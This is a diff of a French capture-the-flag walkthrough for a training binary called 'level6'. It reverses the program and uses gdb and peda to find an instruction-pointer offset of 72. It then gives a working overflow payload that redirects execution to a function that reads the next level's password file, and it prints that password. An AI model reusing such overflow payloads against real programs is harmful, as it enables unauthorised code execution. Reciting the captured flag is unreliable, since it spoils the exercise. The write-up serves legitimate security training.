@@ -2,8 +2,57 @@
 
 - Le programme `./level6` prend au moins un paramètre
     > Segmentation fault (core dumped)
-    `/level6 1`
+
+    `./level6 1`
     > Nope
+
+    Le `main` prend un paramètre et le compare, en fonction du résultat, il appelle la fonction `m` qui *puts* "Nope\n" ou la fonction `n` qui fait un appel système.
+
+- Si on jump à l'adresse de `n` manuellement depuis gdb (`jump *0x08048454`), on peut constater que la fonction `n` appelle un *bash* et *cat* le fichier *.pass* :
+    ```
+    [New process 4645]
+    process 4645 is executing new program: /bin/dash
+    process 4646 is executing new program: /bin/cat
+    /bin/cat: /home/user/level7/.pass: Permission denied
+    ```
+
+
+- Avec peda dans gdb, on récupère la taille allouée pour la copie du paramètre :
+
+    `pattern search`
+    ```
+    Registers contain pattern buffer:
+    EIP+0 found at offset: 72
+    EAX+0 found at offset: 72
+    No register points to pattern buffer
+    Pattern buffer found at:
+    0x0804a008 : offset    0 - size  100 ([heap])
+    0xbffff87d : offset    0 - size  100 ($sp + 0x201 [128 dwords])
+    References to pattern buffer found at:
+    0xbffff670 : 0x0804a008 ($sp + -0xc [-3 dwords])
+    0xbffff680 : 0x0804a008 ($sp + 0x4 [1 dwords])
+    0xbffff69c : 0x0804a008 ($sp + 0x20 [8 dwords])
+    0xbffff668 : 0xbffff87d ($sp + -0x14 [-5 dwords])
+    0xbffff684 : 0xbffff87d ($sp + 0x8 [2 dwords])
+    0xbffff748 : 0xbffff87d ($sp + 0xcc [51 dwords])
+    ```
+
+- On passe alors en paramètre une chaine de la taille de l'offset, suivie de l'adresse de la fonction `n`
+- `./level6 $(python -c 'print("A"*72+"\x54\x84\x04\x08")')`
+> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+
+<br>
+
+
+---
+
+## Ressources
+
+
+
+
+----
 
 - `objdump -d level6` :
   ```
@@ -53,45 +102,3 @@
         80484d2:	c9                   	leave
         80484d3:	c3                   	ret
   ```
-    Le `main` prend un paramètre et le compare, en fonction du résultat, il appelle la fonction `m` qui *puts* "Nope\n" ou la fonction `n` qui fait un appel système.
-
-- Si on jump à l'adresse de `n` manuellement depuis gdb, on peut constater que la fonction `n` appelle un *bash* et *cat* le fichier *.pass* :
-    ```
-    [New process 4645]
-    process 4645 is executing new program: /bin/dash
-    process 4646 is executing new program: /bin/cat
-    /bin/cat: /home/user/level7/.pass: Permission denied
-    ```
-
-
-- Avec peda dans gdb, on récupère la taille allouée pour la copie du paramètre :
-
-    `pattern search`
-    ```
-    Registers contain pattern buffer:
-    EIP+0 found at offset: 72
-    EAX+0 found at offset: 72
-    No register points to pattern buffer
-    Pattern buffer found at:
-    0x0804a008 : offset    0 - size  100 ([heap])
-    0xbffff87d : offset    0 - size  100 ($sp + 0x201 [128 dwords])
-    References to pattern buffer found at:
-    0xbffff670 : 0x0804a008 ($sp + -0xc [-3 dwords])
-    0xbffff680 : 0x0804a008 ($sp + 0x4 [1 dwords])
-    0xbffff69c : 0x0804a008 ($sp + 0x20 [8 dwords])
-    0xbffff668 : 0xbffff87d ($sp + -0x14 [-5 dwords])
-    0xbffff684 : 0xbffff87d ($sp + 0x8 [2 dwords])
-    0xbffff748 : 0xbffff87d ($sp + 0xcc [51 dwords])
-    ```
-
-- On passe alors en paramètre une chaine de la taille de l'offset, suivie de l'adresse de la fonction `n`
-- `./level6 $(python -c 'print("A"*72+"\x54\x84\x04\x08")')`
-> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-
-
-<br>
-
-
----
-
-## Ressources
